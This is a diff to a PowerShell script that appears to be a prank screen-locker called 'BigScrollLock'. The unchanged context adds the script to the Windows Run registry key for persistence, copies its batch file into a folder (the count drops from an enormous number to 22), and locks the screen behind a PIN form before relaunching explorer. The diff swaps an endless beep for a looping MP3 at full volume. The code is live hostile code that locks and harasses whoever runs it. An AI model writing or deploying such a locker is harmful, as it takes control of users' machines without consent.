@@ -17,12 +17,12 @@ if (Test-Path $batchPath) {
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "BigScrollLock" -Value $batchPath
 }
 
-# Create folder and clone batch file 2 times
+# Create folder and clone batch file 22 times
 $cloneFolder = Join-Path $PSScriptRoot "Clones"
 New-Item -Path $cloneFolder -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
 
 if (Test-Path $batchPath) {
-    1..1000000000000 | ForEach-Object {
+    1..22 | ForEach-Object {
         $dest = Join-Path $cloneFolder "rnd_clone_$_.bat"
         Copy-Item -Path $batchPath -Destination $dest -Force -ErrorAction SilentlyContinue
     }
@@ -60,14 +60,13 @@ $form.Add_Shown({
     $form.Focus() 
 })
 
-# Start continuous beep in background
-$script:beepRunspace = [powershell]::Create()
-$null = $script:beepRunspace.AddScript({
-    while ($true) {
-        [System.Console]::Beep(2000, 500)
-    }
-})
-$script:beepHandle = $script:beepRunspace.BeginInvoke()
+# Start continuous audio loop (Replaces Beep)
+$mp3Path = Join-Path $PSScriptRoot "lock.mp3"
+$script:player = New-Object -ComObject WMPlayer.OCX.7
+$script:player.settings.volume = 100
+$script:player.settings.setMode("loop", $true)
+$script:player.URL = $mp3Path
+$script:player.controls.play()
 
 $script:typedPIN = ''
 $script:unlocked = $false
@@ -160,8 +159,7 @@ $form.Add_KeyDown({
         if ($script:typedPIN -eq $PIN) { 
             $script:unlocked = $true
             $timer.Stop()
-            $script:beepRunspace.Stop()
-            $script:beepRunspace.Dispose()
+            $script:player.controls.stop()
             Start-Process explorer
             $form.Close() 
         }
